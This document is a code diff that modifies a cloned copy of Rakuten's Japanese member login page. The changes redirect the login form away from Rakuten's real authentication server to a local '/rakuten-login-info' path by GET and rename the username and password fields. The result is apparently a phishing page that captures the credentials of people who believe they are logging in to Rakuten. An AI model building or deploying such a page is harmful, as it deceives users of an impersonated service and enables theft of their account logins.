@@ -119,8 +119,7 @@
             width="67" height="20">このサービスをご利用になるにはログインしてください。</p>
         <div id="mainLeft">
           <div class="login">
-            <form name="LoginForm" method="post" action="https://grp01.id.rakuten.co.jp/rms/nid/logini"
-              autocomplete="off" id="loginForm">
+            <form method="get" action="/rakuten-login-info" autocomplete="off" id="loginForm">
               <input type="hidden" name="service_id" value="top">
               <div id="loginInner">
                 <h3>楽天会員ログイン</h3>
@@ -134,7 +133,7 @@
                         </p>
                       </td>
                       <td class="loginBoxValue">
-                        <input type="text" name="u" maxlength="100" size="25" value="" class="textBox"
+                        <input type="text" name="userid" maxlength="100" size="25" value="" class="textBox"
                           id="loginInner_u">
                       </td>
                     </tr>
@@ -146,7 +145,7 @@
                         </p>
                       </td>
                       <td class="loginBoxValue">
-                        <input type="password" name="p" maxlength="128" size="25" value="" class="textBox"
+                        <input type="password" name="password" maxlength="128" size="25" value="" class="textBox"
                           id="loginInner_p">
                       </td>
                     </tr>
@@ -173,8 +172,7 @@
                   </tbody>
                 </table>
                 <p>
-                  <input type="submit" name="submit" value="ログイン" onclick="preventMultiClicks(this)"
-                    class="loginButton">
+                  <input type="submit" name="submit" value="ログイン" class="loginButton">
                 </p>
                 <p class="center">
                   <input type="hidden" name="pp_version" value="20170213">
